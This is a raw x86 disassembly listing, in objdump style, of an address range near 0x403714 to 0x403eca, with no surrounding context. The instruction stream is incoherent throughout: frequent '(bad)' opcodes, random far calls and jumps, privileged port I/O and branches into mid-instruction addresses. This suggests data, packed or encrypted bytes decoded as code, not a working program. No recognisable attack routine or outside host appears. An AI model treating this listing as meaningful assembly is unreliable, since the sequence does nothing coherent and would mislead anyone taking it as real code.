  403714:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403715:	sbb    al,0xd2
  403717:	call   0x9f6d:0x3f8507c9
  40371e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40371f:	leave  
  403720:	test   eax,0x8a1338ac
  403725:	adc    BYTE PTR [ebp-0x33cbcf57],0xc6
  40372c:	(bad)  
  40372d:	inc    DWORD PTR ds:0xd0f5522f
  403733:	sub    BYTE PTR [ecx+0x5a],bl
  403736:	mov    dl,0x91
  403738:	mov    ds:0x4af54cf9,eax
  40373d:	imul   eax,DWORD PTR [edi],0x7dbe8026
  403743:	adc    BYTE PTR [esi-0x1d],bh
  403746:	(bad)  
  403747:	jne    0x403729
  403749:	inc    eax
  40374a:	repz or eax,0x4fa4024c
  403750:	fld    QWORD PTR [ebx]
  403752:	out    0x81,al
  403754:	xor    ebx,esi
  403756:	in     al,0x1d
  403758:	jnp    0x4036f6
  40375a:	stos   BYTE PTR es:[edi],al
  40375b:	mov    DWORD PTR [eax+0x6a501ec9],ebp
  403761:	dec    eax
  403762:	lea    ebp,[ecx-0x1cf151c3]
  403768:	iret   
  403769:	push   ecx
  40376a:	pop    eax
  40376b:	mov    al,0x65
  40376d:	and    eax,DWORD PTR [edi+0x6c6cd141]
  403773:	bound  ebx,QWORD PTR [edi+0x34]
  403776:	xlat   BYTE PTR ds:[ebx]
  403777:	and    BYTE PTR [eax-0x4a],bh
  40377a:	xor    al,BYTE PTR [eax]
  40377c:	fidiv  WORD PTR [ebp-0x6d]
  40377f:	mov    al,0xcb
  403781:	fisubr WORD PTR [edi]
  403783:	inc    ebx
  403784:	xor    al,0xc5
  403786:	and    DWORD PTR [edi+ecx*2-0x708a948],edi
  40378d:	xor    edx,DWORD PTR [ebx-0x34]
  403790:	arpl   WORD PTR [ebp+0x46],bx
  403793:	mov    al,0x87
  403795:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403796:	test   ebx,edi
  403798:	mov    bl,0xd0
  40379a:	out    0x1,al
  40379c:	inc    eax
  40379d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40379e:	or     eax,0xc027366
  4037a3:	bound  ecx,QWORD PTR [edi-0x597607cc]
  4037a9:	mov    ch,0x30
  4037ab:	test   BYTE PTR [ebx+0x3b],dh
  4037ae:	stc    
  4037af:	mov    ecx,0x1a6c95b4
  4037b4:	mov    ds,esp
  4037b6:	lods   al,BYTE PTR ds:[esi]
  4037b7:	fimul  WORD PTR [edx]
  4037b9:	sahf   
  4037ba:	adc    eax,0x8cb5ea6e
  4037bf:	jbe    0x403830
  4037c1:	cmp    al,0xc
  4037c3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4037c4:	cmp    ecx,DWORD PTR [edi+esi*1]
  4037c7:	push   esp
  4037c8:	lock add DWORD PTR [edx+0x10],ebp
  4037cc:	scas   eax,DWORD PTR es:[edi]
  4037cd:	pushf  
  4037ce:	outs   dx,DWORD PTR ds:[esi]
  4037cf:	mov    ebp,es
  4037d1:	add    al,bl
  4037d3:	jno    0x4037ce
  4037d5:	sti    
  4037d6:	test   al,0xb0
  4037d8:	sbb    esp,DWORD PTR [ecx-0x6a]
  4037db:	dec    ebx
  4037dc:	inc    edx
  4037dd:	and    DWORD PTR ds:0xc52cd14,ebx
  4037e3:	mov    ds:0x41fedd4b,al
  4037e8:	ins    BYTE PTR es:[edi],dx
  4037e9:	fs loopne 0x403783
  4037ec:	and    BYTE PTR [edx],al
  4037ee:	lds    eax,FWORD PTR [eax+0x2af6aa55]
  4037f4:	cmp    al,0x39
  4037f6:	mov    eax,0xe02a5a23
  4037fb:	cwde   
  4037fc:	xchg   BYTE PTR [ebx-0x3aa840d8],bl
  403802:	aad    0x60
  403804:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403805:	shl    cl,0x5
  403808:	shl    dl,cl
  40380a:	and    BYTE PTR [ebp+0x45b2dc7e],cl
  403810:	in     al,0x6
  403812:	pop    ss
  403813:	mov    al,0x70
  403815:	push   ecx
  403816:	mov    eax,0x7279ac04
  40381b:	pop    edi
  40381c:	mov    edi,0x84f3066e
  403821:	popf   
  403822:	sbb    DWORD PTR [ebx+0x56],0x7
  403826:	out    0x22,eax
  403828:	cld    
  403829:	(bad)  
  40382a:	clc    
  40382b:	cmp    eax,DWORD PTR [ebx]
  40382d:	loope  0x403854
  40382f:	and    BYTE PTR [edx-0x32],dh
  403832:	addr16 inc edi
  403834:	test   DWORD PTR [ebp+edi*8-0x26],esi
  403838:	dec    ebp
  403839:	js     0x403814
  40383b:	sbb    BYTE PTR [esp+ebp*4],bh
  40383e:	push   esi
  40383f:	add    eax,0xa1786dba
  403844:	call   0x964f:0x772734cf
  40384b:	mov    ds:0xd17d9f16,al
  403850:	jp     0x403833
  403852:	cmp    eax,0x611bc581
  403857:	mov    dh,BYTE PTR [edx]
  403859:	ret    0x754a
  40385c:	or     al,0xa7
  40385e:	xor    DWORD PTR [eax],eax
  403860:	mov    dl,BYTE PTR [ecx]
  403862:	push   edx
  403863:	xor    al,0x1e
  403865:	push   0x53
  403867:	sub    DWORD PTR [edi],ecx
  403869:	inc    esi
  40386a:	inc    ebx
  40386b:	daa    
  40386c:	bound  ebp,QWORD PTR [edi-0x2a]
  40386f:	imul   BYTE PTR [eax+eiz*2+0x77051fa7]
  403876:	inc    esi
  403877:	mov    edi,0xcc0925b0
  40387c:	add    eax,0x4232aa78
  403881:	pushf  
  403882:	sub    edi,DWORD PTR [edi-0x7ce3d829]
  403888:	jns    0x40387a
  40388a:	rcl    DWORD PTR gs:[esi+edx*1-0x28],cl
  40388f:	jl     0x403855
  403891:	inc    esp
  403892:	ret    0xbdf3
  403895:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403896:	mov    DWORD PTR [esp+edi*8-0x10],ebx
  40389a:	jae    0x4038d8
  40389c:	mov    cl,0x5d
  40389e:	fs mov dl,0x44
  4038a1:	dec    esi
  4038a2:	xchg   DWORD PTR ds:0xa6eaf44e,edx
  4038a8:	sbb    ebx,DWORD PTR [ebx-0x49]
  4038ab:	xchg   ebx,eax
  4038ac:	sub    ebp,DWORD PTR [ecx-0x47ab2366]
  4038b2:	cld    
  4038b3:	ja     0x403836
  4038b5:	mov    esi,0x61faea33
  4038ba:	jp     0x4038bd
  4038bc:	pusha  
  4038bd:	popa   
  4038be:	xor    DWORD PTR [eax],edx
  4038c0:	sub    cl,BYTE PTR [eax]
  4038c2:	out    0x7d,al
  4038c4:	sbb    ax,0x9b8a
  4038c8:	push   es
  4038c9:	repz or dl,bl
  4038cc:	adc    al,0x65
  4038ce:	(bad)  
  4038cf:	out    0xe4,al
  4038d1:	sbb    ebp,DWORD PTR [ebx+0x55535dec]
  4038d7:	jmp    0x15820706
  4038dc:	cwde   
  4038dd:	out    dx,al
  4038de:	stc    
  4038df:	or     cl,BYTE PTR ds:0xc23ef245
  4038e5:	add    cl,bl
  4038e7:	fbstp  TBYTE PTR [ebp+0x1e]
  4038ea:	mov    ecx,0x8e23d5fa
  4038ef:	outs   dx,DWORD PTR ds:[esi]
  4038f0:	popa   
  4038f1:	nop
  4038f2:	mov    esi,0xba2bc298
  4038f7:	je     0x403952
  4038f9:	xchg   ecx,edx
  4038fb:	sbb    ah,BYTE PTR [ecx]
  4038fd:	adc    ecx,ebp
  4038ff:	pop    ecx
  403900:	icebp  
  403901:	lods   eax,DWORD PTR ds:[esi]
  403902:	sbb    al,0x5a
  403904:	(bad)  
  403905:	test   al,0x93
  403907:	ins    WORD PTR es:[edi],dx
  403909:	daa    
  40390a:	sbb    edi,DWORD PTR [ecx-0x64908767]
  403910:	pop    ss
  403911:	add    DWORD PTR [eax+0x7b],ebp
  403914:	shl    edx,1
  403916:	dec    ecx
  403917:	jle    0x4038ec
  403919:	dec    esi
  40391a:	push   0xe3f9bf5c
  40391f:	push   edx
  403920:	not    BYTE PTR [eax-0x3a]
  403923:	mov    edx,0xaaea1149
  403928:	push   eax
  403929:	popa   
  40392a:	pushw  es
  40392c:	inc    ebx
  40392d:	rol    DWORD PTR [ecx-0x777e73e8],0xa3
  403934:	retf   0xb0c8
  403937:	jae    0x403945
  403939:	push   0xffffffd3
  40393b:	cld    
  40393c:	xchg   BYTE PTR [ecx+eiz*4],ah
  40393f:	pop    ebp
  403940:	ds jb  0x4038fa
  403943:	xor    al,0x72
  403945:	cmp    eax,0x43fe7b1b
  40394a:	rol    DWORD PTR [ebx+0x68c92d07],cl
  403950:	dec    esp
  403951:	fisub  DWORD PTR [ecx+0x374ceb57]
  403957:	jbe    0x403902
  403959:	call   0xc650:0x3f6c8fe1
  403960:	test   bh,ch
  403962:	(bad)  
  403963:	fstp   DWORD PTR [ebx]
  403965:	fcomp  QWORD PTR [esi]
  403967:	not    BYTE PTR [ecx+eiz*4+0x14]
  40396b:	scas   al,BYTE PTR es:[edi]
  40396c:	xor    ah,0xc9
  40396f:	jg     0x4039af
  403971:	jne    0x4039d4
  403973:	stos   DWORD PTR es:[edi],eax
  403974:	inc    BYTE PTR [eax+0x2f6fad78]
  40397a:	aaa    
  40397b:	xor    ah,ah
  40397d:	jle    0x403984
  40397f:	aaa    
  403980:	adc    eax,0x9553cc37
  403985:	scas   al,BYTE PTR es:[edi]
  403986:	pushf  
  403987:	pop    ss
  403988:	pop    ecx
  403989:	push   ecx
  40398a:	fs or  bh,dl
  40398d:	aas    
  40398e:	mov    cl,0x10
  403990:	dec    esi
  403991:	test   BYTE PTR [edi+0xd],ch
  403994:	mov    BYTE PTR [eax+0x475ae049],ah
  40399a:	cmc    
  40399b:	inc    ebx
  40399c:	ja     0x40393b
  40399e:	shl    BYTE PTR [edi],0xb2
  4039a1:	pop    ebp
  4039a2:	cmp    bl,BYTE PTR [ebx+0x49869939]
  4039a8:	add    DWORD PTR [edx+0x71],ebp
  4039ab:	dec    esp
  4039ac:	cld    
  4039ad:	dec    ebx
  4039ae:	push   ecx
  4039af:	ret    
  4039b0:	jecxz  0x40393a
  4039b2:	mov    WORD PTR [esi],?
  4039b4:	jle    0x4039d5
  4039b6:	mov    ds:0x92a97108,eax
  4039bb:	mov    ds:0x6bb6f8be,al
  4039c0:	repz jb 0x40397c
  4039c3:	cmp    eax,DWORD PTR [eax-0x75168e1d]
  4039c9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4039ca:	mov    ebp,0xe0da84f0
  4039cf:	out    dx,al
  4039d0:	outs   dx,BYTE PTR ds:[esi]
  4039d1:	repz xor al,0xc8
  4039d4:	neg    BYTE PTR [eax+0x29]
  4039d7:	and    eax,0x5a0a75fa
  4039dc:	out    0x71,eax
  4039de:	mov    al,0x59
  4039e0:	scas   al,BYTE PTR es:[edi]
  4039e1:	das    
  4039e2:	call   0x107e6573
  4039e7:	aas    
  4039e8:	jmp    0x73f9:0xf1c2c2a2
  4039ef:	inc    ecx
  4039f0:	adc    DWORD PTR ds:0xb2dc384,0x5ba557c
  4039fa:	sbb    eax,0x9990a42a
  4039ff:	ret    
  403a00:	push   eax
  403a01:	aaa    
  403a02:	(bad)  
  403a03:	loope  0x4039b7
  403a05:	ja     0x403a52
  403a07:	fiadd  WORD PTR [edx+ecx*4]
  403a0a:	imul   bh
  403a0c:	ja     0x403a2c
  403a0e:	daa    
  403a0f:	pop    ebx
  403a10:	test   eax,0xdee2a6ec
  403a15:	dec    edx
  403a16:	xchg   esi,esi
  403a18:	add    edx,edi
  403a1a:	and    al,0x7d
  403a1c:	jne    0x403a43
  403a1e:	lea    esi,[ebp+0x7795ca35]
  403a24:	mov    cl,BYTE PTR [ebx+0x23d089a9]
  403a2a:	push   eax
  403a2b:	mov    esi,0x1dea9a81
  403a30:	sub    al,0x41
  403a32:	shr    BYTE PTR [ebp-0x62e887ff],cl
  403a38:	or     BYTE PTR [ebx+0x13],ah
  403a3b:	push   ebx
  403a3c:	sar    DWORD PTR [eax-0x73],1
  403a3f:	vunpcklps xmm4,xmm6,xmm0
  403a43:	jae    0x403a38
  403a45:	loope  0x403a8d
  403a47:	add    eax,0xf260862a
  403a4c:	stos   DWORD PTR es:[edi],eax
  403a4d:	retf   0x10a0
  403a50:	adc    BYTE PTR [ebx],ch
  403a52:	dec    esi
  403a53:	mov    ds:0xdd7c39ae,eax
  403a58:	clc    
  403a59:	ins    DWORD PTR es:[edi],dx
  403a5a:	and    esp,DWORD PTR [ebx-0x6c900827]
  403a60:	sbb    al,BYTE PTR [ecx+0x31]
  403a63:	repz mov bh,0x67
  403a66:	sahf   
  403a67:	repz mov ds:0x7c8a4083,al
  403a6d:	and    BYTE PTR [edi],0xdf
  403a70:	xchg   DWORD PTR ds:0xa0d4a5ac,esp
  403a76:	sbb    al,0x65
  403a78:	inc    ebx
  403a79:	outs   dx,DWORD PTR ds:[esi]
  403a7a:	(bad)  
  403a7b:	lods   eax,DWORD PTR ds:[esi]
  403a7c:	mov    esp,0x518f4944
  403a81:	pop    es
  403a82:	add    ch,0xe8
  403a85:	sbb    BYTE PTR [edi-0x46a7237c],al
  403a8b:	aas    
  403a8c:	clc    
  403a8d:	pop    edi
  403a8e:	mov    ds:0xe8791192,eax
  403a93:	(bad)  
  403a95:	cli    
  403a96:	ds adc eax,0xc5e20d4a
  403a9c:	adc    ah,BYTE PTR [eax-0x39]
  403a9f:	fiadd  WORD PTR [edx+esi*1+0x15]
  403aa3:	repz or BYTE PTR [ebp+0x577e582a],dl
  403aaa:	add    ebp,ecx
  403aac:	fistp  DWORD PTR [esi-0x5146e2d1]
  403ab2:	bound  esp,QWORD PTR [ebx]
  403ab4:	add    al,0x5d
  403ab6:	push   edx
  403ab7:	mov    ds:0x369c7fa5,eax
  403abc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403abd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403abe:	outs   dx,BYTE PTR ds:[esi]
  403abf:	les    ebx,FWORD PTR [ebx-0x14a41d56]
  403ac5:	sbb    BYTE PTR [edx-0x75],ah
  403ac8:	cmp    eax,0xf7c348a6
  403acd:	xor    BYTE PTR [ecx+esi*1],0x23
  403ad1:	stos   BYTE PTR es:[edi],al
  403ad2:	xchg   ecx,eax
  403ad3:	imul   ecx,DWORD PTR ds:0x2cc17659,0xae143c1b
  403add:	jo     0x403a72
  403adf:	js     0x403af5
  403ae1:	pop    eax
  403ae2:	dec    edi
  403ae3:	(bad)  
  403ae4:	dec    BYTE PTR [edx+eax*2]
  403ae7:	outs   dx,DWORD PTR ds:[esi]
  403ae8:	into   
  403ae9:	mov    ds:0x1ed024e3,al
  403aee:	(bad)  [eax-0x7fa92da1]
  403af4:	iret   
  403af5:	ins    DWORD PTR es:[edi],dx
  403af6:	jno    0x403af7
  403af8:	cmp    esp,ebp
  403afa:	fnstcw WORD PTR [si-0x5174]
  403aff:	mov    ds:0x7322e2ff,eax
  403b04:	jmp    0x9dbbaf4f
  403b09:	pop    esp
  403b0a:	hlt    
  403b0b:	shr    DWORD PTR [edx+ebx*4+0x24],cl
  403b0f:	xor    esi,DWORD PTR [edi]
  403b11:	fiadd  WORD PTR [ebx]
  403b13:	or     DWORD PTR [edx+0x14dc2a02],ebp
  403b19:	push   esp
  403b1a:	xchg   ebp,eax
  403b1b:	pop    eax
  403b1c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403b1d:	scas   eax,DWORD PTR es:[edi]
  403b1e:	adc    dh,BYTE PTR [edi-0x1f]
  403b21:	xor    cl,BYTE PTR [edi-0x6d]
  403b24:	(bad)  
  403b26:	outs   dx,DWORD PTR ds:[esi]
  403b27:	aaa    
  403b28:	test   eax,0x1c017f37
  403b2d:	adc    dl,BYTE PTR [eax]
  403b2f:	enter  0xd204,0xc
  403b33:	pop    ebp
  403b34:	outs   dx,DWORD PTR ds:[esi]
  403b35:	jl     0x403b00
  403b37:	jg     0x403b6a
  403b39:	inc    ecx
  403b3a:	push   esi
  403b3b:	ret    
  403b3c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403b3d:	scas   eax,DWORD PTR es:[edi]
  403b3e:	outs   dx,BYTE PTR ds:[esi]
  403b3f:	mov    bh,BYTE PTR [eax+esi*8-0x158d9e05]
  403b46:	add    bl,BYTE PTR [eax]
  403b48:	xchg   edi,eax
  403b49:	ret    
  403b4a:	mov    esp,0xeeb53148
  403b4f:	mov    al,ds:0x8c55fe1f
  403b54:	pop    es
  403b55:	repnz bswap eax
  403b58:	mov    ch,0x40
  403b5a:	mov    edi,DWORD PTR [ecx-0x50]
  403b5d:	sti    
  403b5e:	ins    DWORD PTR es:[edi],dx
  403b5f:	clc    
  403b60:	cmp    edi,DWORD PTR [esp+edx*2]
  403b63:	mov    ebx,0x637b6984
  403b68:	pop    esp
  403b69:	ret    0xa384
  403b6c:	sti    
  403b6d:	pop    esp
  403b6e:	ss adc ebx,edi
  403b71:	xor    bl,BYTE PTR [eax-0x2d]
  403b74:	aaa    
  403b75:	call   0x4474fc55
  403b7a:	int    0xac
  403b7c:	push   ecx
  403b7d:	mov    ds,WORD PTR [ebp+eax*4+0x2ba90efb]
  403b84:	mov    ds:0x6b245a2f,eax
  403b89:	add    BYTE PTR [ecx],dh
  403b8b:	shl    BYTE PTR [ecx+0x7bb4dc2c],1
  403b91:	xchg   DWORD PTR [esi+0x18],edx
  403b94:	imul   edx,DWORD PTR [edi],0xd6adc3b3
  403b9a:	mov    BYTE PTR [edx+0x6719fb9d],bl
  403ba0:	mov    eax,0x6e5b8bc3
  403ba5:	inc    edi
  403ba6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403ba7:	mov    ds:0x7dc3edd0,al
  403bac:	jge    0x403c13
  403bae:	push   es
  403baf:	dec    ebp
  403bb0:	mov    esi,0x754e2b97
  403bb5:	inc    edx
  403bb7:	push   ecx
  403bb8:	(bad)  
  403bb9:	fist   WORD PTR [eax+0x1a]
  403bbc:	adc    esp,edi
  403bbe:	shl    BYTE PTR [esi+0x6c448bab],1
  403bc4:	sbb    ah,dl
  403bc6:	ror    DWORD PTR [ebp-0x2b],1
  403bc9:	sbb    eax,0xd95c6c40
  403bce:	jl     0x403bf5
  403bd0:	ror    DWORD PTR [eax+0x19],0xf0
  403bd4:	sub    eax,0x4ef04b92
  403bd9:	ret    
  403bda:	adc    bl,bl
  403bdc:	rcl    DWORD PTR [ebp-0x2c61f741],1
  403be2:	jg     0x403c45
  403be4:	and    ah,al
  403be6:	cld    
  403be7:	rol    DWORD PTR [edx-0x547eec77],cl
  403bed:	inc    ebx
  403bee:	shl    DWORD PTR [ebx-0x3267d055],cl
  403bf4:	xor    al,bh
  403bf6:	jmp    0x88b4:0xa720999d
  403bfd:	scas   eax,DWORD PTR es:[edi]
  403bfe:	sub    esp,DWORD PTR [edx+0x62]
  403c01:	ja     0x403bb9
  403c03:	mov    ebp,0xb075f544
  403c08:	push   ss
  403c09:	jbe    0x403c7a
  403c0b:	or     al,0xff
  403c0d:	sub    ebx,DWORD PTR [edi+ebp*4]
  403c10:	dec    edi
  403c11:	add    cl,dl
  403c13:	fadd   DWORD PTR [ecx+0x3f]
  403c16:	inc    ebx
  403c17:	push   cs
  403c18:	inc    eax
  403c19:	enter  0x2cab,0x23
  403c1d:	inc    eax
  403c1e:	add    esi,DWORD PTR [eax+0x46]
  403c21:	mov    al,ds:0x3e41753
  403c26:	popf   
  403c27:	add    eax,esi
  403c29:	jb     0x403bc6
  403c2b:	mov    ds:0xbd0d9c01,al
  403c30:	call   0xe1281b1f
  403c35:	aaa    
  403c36:	mov    bh,0x26
  403c38:	int    0xd2
  403c3a:	jae    0x403c5e
  403c3c:	mov    esi,0x9695ca84
  403c41:	cmp    edx,DWORD PTR [ebp+0x2b]
  403c44:	nop
  403c45:	fidiv  DWORD PTR [ebp-0x20c7a9f9]
  403c4b:	aas    
  403c4c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403c4d:	sbb    bh,BYTE PTR [ebx-0x38]
  403c50:	xchg   edi,eax
  403c51:	jecxz  0x403c91
  403c53:	cld    
  403c54:	dec    ebp
  403c55:	xchg   ebx,eax
  403c56:	enter  0x6a90,0xfc
  403c5a:	(bad)  
  403c5c:	scas   eax,DWORD PTR es:[edi]
  403c5d:	popf   
  403c5e:	sbb    edi,DWORD PTR [ecx+ebx*2+0x198a4766]
  403c65:	push   ss
  403c66:	les    esp,FWORD PTR [esi+0x76]
  403c69:	push   ds
  403c6a:	xchg   ecx,eax
  403c6b:	outs   dx,DWORD PTR ds:[esi]
  403c6c:	lods   eax,DWORD PTR ds:[esi]
  403c6d:	in     al,dx
  403c6e:	scas   eax,DWORD PTR es:[edi]
  403c6f:	retf   0x47dc
  403c72:	ins    DWORD PTR es:[edi],dx
  403c73:	int3   
  403c74:	mov    dl,0x60
  403c76:	gs dec ecx
  403c78:	test   al,0xa2
  403c7a:	jg     0x403c6c
  403c7c:	adc    eax,0x62eb0ed7
  403c81:	and    DWORD PTR [eax+0x60fdff46],ebx
  403c87:	mov    ch,0x91
  403c89:	jno    0x403c25
  403c8b:	mov    al,0x65
  403c8d:	cmp    DWORD PTR [esi+0x7a],eax
  403c90:	ins    BYTE PTR es:[edi],dx
  403c91:	rcl    BYTE PTR [esi],1
  403c93:	stos   BYTE PTR es:[edi],al
  403c94:	dec    ebx
  403c95:	retf   
  403c96:	pop    ebx
  403c97:	pop    edi
  403c98:	jbe    0x403cf9
  403c9a:	push   ebp
  403c9b:	sub    al,0xc3
  403c9d:	or     bl,BYTE PTR [esi]
  403c9f:	xchg   ebx,eax
  403ca0:	xchg   DWORD PTR [edx-0x1b],esi
  403ca3:	retf   
  403ca4:	call   0xa8dda0db
  403ca9:	mov    ds:0x5d0a76ec,eax
  403cae:	jg     0x403cb3
  403cb0:	xchg   esp,eax
  403cb1:	ds ins DWORD PTR es:[edi],dx
  403cb3:	imul   esp,DWORD PTR [esi-0x32fcc2c5],0x60
  403cba:	out    0xdb,eax
  403cbc:	sub    al,0x58
  403cbe:	cmp    DWORD PTR [edi+0x3b5cb885],0x9bb7b97f
  403cc8:	xchg   edx,eax
  403cc9:	call   0xf925737b
  403cce:	pop    ss
  403ccf:	sub    al,0x9d
  403cd1:	cdq    
  403cd2:	adc    edi,DWORD PTR [ecx-0x274a58ee]
  403cd8:	ja     0x403cea
  403cda:	fs mov al,0x4b
  403cdd:	push   ss
  403cde:	arpl   WORD PTR [esi-0x2a4161e0],ax
  403ce4:	adc    ecx,DWORD PTR [edx]
  403ce6:	pop    esp
  403ce7:	adc    ecx,ecx
  403ce9:	in     al,dx
  403cea:	push   ebp
  403ceb:	ret    
  403cec:	or     cl,al
  403cee:	and    ecx,eax
  403cf0:	sbb    BYTE PTR [eax-0x61],0x9f
  403cf4:	lock sbb BYTE PTR [ebp+ebx*8-0x80],ch
  403cf9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403cfa:	dec    esp
  403cfb:	mov    esi,ebp
  403cfd:	or     DWORD PTR [edi+0x25],ebp
  403d00:	xchg   edx,eax
  403d01:	mov    edx,ebp
  403d03:	test   al,0x4b
  403d05:	(bad)
  403d09:	xor    edi,esp
  403d0b:	aad    0xc0
  403d0d:	jo     0x403cc6
  403d0f:	bound  ebx,QWORD PTR [edx+0x6b]
  403d12:	cvtdq2ps xmm6,xmm6
  403d15:	pop    ds
  403d16:	cld    
  403d17:	inc    ecx
  403d18:	fild   QWORD PTR [ebx-0x280261ff]
  403d1e:	sahf   
  403d1f:	dec    ecx
  403d20:	in     al,dx
  403d21:	mov    bl,0x5c
  403d23:	ret    0x591e
  403d26:	jmp    0x465d9506
  403d2b:	push   ebp
  403d2c:	sub    eax,0xb254bbd0
  403d31:	xor    BYTE PTR [ebx+0x1f],0xc5
  403d35:	sub    esi,DWORD PTR [edi+0x7d565d4f]
  403d3b:	mov    dh,0x65
  403d3d:	lahf   
  403d3e:	and    cl,BYTE PTR [edx-0x3c23e2ce]
  403d44:	fs pop edx
  403d46:	cmp    ah,bh
  403d48:	xchg   esp,eax
  403d49:	jmp    0xe38d:0xbc01b2af
  403d50:	pop    esi
  403d51:	retf   0x1c4
  403d54:	jo     0x403d1e
  403d56:	mov    ecx,DWORD PTR [eax+0x3a]
  403d59:	cmp    DWORD PTR [ecx-0x2d3e14d2],eax
  403d5f:	and    cl,cl
  403d61:	mov    ch,0xa8
  403d63:	sub    dl,BYTE PTR [ebx-0x2eb09eb]
  403d69:	and    al,0xe9
  403d6b:	xor    BYTE PTR [eax+0x5e],0x1c
  403d6f:	lods   eax,DWORD PTR ds:[esi]
  403d70:	lds    edi,FWORD PTR [ebx-0x45]
  403d73:	(bad)  
  403d75:	inc    DWORD PTR [esi-0x49a6d852]
  403d7b:	outs   dx,BYTE PTR ds:[esi]
  403d7c:	ja     0x403dc6
  403d7e:	lods   al,BYTE PTR ds:[esi]
  403d7f:	(bad)  
  403d80:	retf   0x1a22
  403d83:	or     eax,0xe16e71fc
  403d88:	out    dx,al
  403d89:	ficom  WORD PTR [eax]
  403d8b:	shl    DWORD PTR [edx+eiz*1],cl
  403d8e:	loop   0x403dec
  403d90:	mov    DWORD PTR [eax-0x36215e62],ebx
  403d96:	out    0xfb,eax
  403d98:	add    eax,0x283c7bd8
  403d9d:	push   eax
  403d9e:	xchg   ecx,eax
  403d9f:	or     edx,DWORD PTR ds:0x78d9748b
  403da5:	adc    ah,ch
  403da7:	icebp  
  403da8:	cmp    BYTE PTR [edi],dh
  403daa:	mov    eax,ds:0x4b2f074f
  403daf:	call   0x7c3f:0x89d401b5
  403db6:	aam    0x10
  403db8:	sub    dl,BYTE PTR [ecx-0x474790be]
  403dbe:	push   cs
  403dbf:	and    al,0xe2
  403dc1:	popf   
  403dc2:	or     ch,ch
  403dc4:	ins    DWORD PTR es:[edi],dx
  403dc5:	inc    ebp
  403dc6:	xchg   edx,eax
  403dc7:	mov    esi,0xef0670b6
  403dcc:	call   0x346e:0x7d712f4e
  403dd3:	in     eax,dx
  403dd4:	mul    DWORD PTR [ebp+0x45]
  403dd7:	mov    eax,ds:0x91e47ef0
  403ddc:	lock (bad) 
  403dde:	push   ebp
  403ddf:	sbb    al,0x12
  403de1:	dec    edi
  403de2:	div    DWORD PTR [ecx+esi*8+0x90d2208]
  403de9:	mov    ds:0x58af915d,al
  403dee:	lds    esi,FWORD PTR [ecx]
  403df0:	mov    cs,WORD PTR [esi]
  403df2:	(bad)  
  403df3:	xchg   ecx,eax
  403df4:	xor    esp,DWORD PTR [eax]
  403df6:	dec    edi
  403df7:	fcom   st(5)
  403df9:	dec    esi
  403dfa:	xor    cl,BYTE PTR [edx+0x54]
  403dfd:	adc    BYTE PTR [edi-0x21],ch
  403e00:	add    al,0xf1
  403e02:	and    DWORD PTR [edx-0x41fbd2e6],ebp
  403e08:	adc    ecx,DWORD PTR [eax]
  403e0a:	in     eax,0xa5
  403e0c:	xor    al,0xe8
  403e0e:	push   ss
  403e0f:	shr    DWORD PTR [eax-0x6d],cl
  403e12:	popa   
  403e13:	pop    edi
  403e14:	jnp    0x403e1c
  403e16:	enter  0xc943,0xc3
  403e1a:	add    DWORD PTR ds:0x3d16e845,esi
  403e20:	add    DWORD PTR [ebx-0x5d],esp
  403e23:	jecxz  0x403e01
  403e25:	sub    al,0x1a
  403e27:	cwde   
  403e28:	repz mov ds,WORD PTR [edi+edi*4+0x7e]
  403e2d:	adc    esi,esi
  403e2f:	sar    DWORD PTR [edi-0x63c26393],0xc5
  403e36:	sub    BYTE PTR [ecx-0x1d],0x37
  403e3a:	(bad)  
  403e3b:	(bad)  
  403e3c:	out    dx,eax
  403e3d:	xor    BYTE PTR [edx+0x3b],al
  403e40:	mul    BYTE PTR [ebp-0x453d831e]
  403e46:	xchg   esp,eax
  403e47:	push   ecx
  403e48:	pop    ebx
  403e49:	loopne 0x403e72
  403e4b:	push   ebx
  403e4c:	in     eax,0x6c
  403e4e:	test   DWORD PTR cs:[ecx+0x6c],edi
  403e52:	cmc    
  403e53:	ds test eax,0xfecfa57c
  403e59:	leave  
  403e5a:	scas   al,BYTE PTR es:[edi]
  403e5b:	loopne 0x403ebe
  403e5d:	add    BYTE PTR [esi],ah
  403e5f:	mov    cl,0xc8
  403e61:	jmp    0x403e74
  403e63:	mov    ds:0x5191613f,al
  403e68:	ja     0x403eba
  403e6a:	or     DWORD PTR [ecx+0x7f1d9701],edi
  403e70:	(bad)  [edx+0x6a]
  403e73:	adc    ebx,edx
  403e75:	jo     0x403ea4
  403e77:	mov    ah,BYTE PTR [ebx]
  403e79:	xor    BYTE PTR [ecx+0x2],ch
  403e7c:	pop    ebp
  403e7d:	mov    ah,BYTE PTR [ecx]
  403e7f:	and    ah,bh
  403e81:	fwait
  403e82:	(bad)  
  403e83:	addr16 or cl,bl
  403e86:	mov    DWORD PTR [edi-0x52183d37],eax
  403e8c:	push   ebx
  403e8d:	nop
  403e8e:	add    BYTE PTR [edi+0x2f5ee550],cl
  403e94:	inc    ecx
  403e95:	inc    esi
  403e96:	sbb    eax,0x8556a706
  403e9b:	dec    ebp
  403e9c:	mov    gs:0xf41a371f,al
  403ea2:	les    esp,FWORD PTR [ebx]
  403ea4:	nop
  403ea5:	sub    al,0xa0
  403ea7:	adc    eax,0x780c7fa3
  403eac:	jmp    0xe8a4:0x6bc4b688
  403eb3:	call   0xf3128ab2
  403eb8:	pop    ebx
  403eb9:	xchg   BYTE PTR [edx],bh
  403ebb:	and    bh,BYTE PTR [ecx-0x3]
  403ebe:	ds add ebx,ebx
  403ec1:	pop    ebx
  403ec2:	cmp    cl,dh
  403ec4:	fcmove st,st(2)
  403ec6:	push   es
  403ec7:	pop    esi
  403ec8:	dec    al
  403eca:	std    
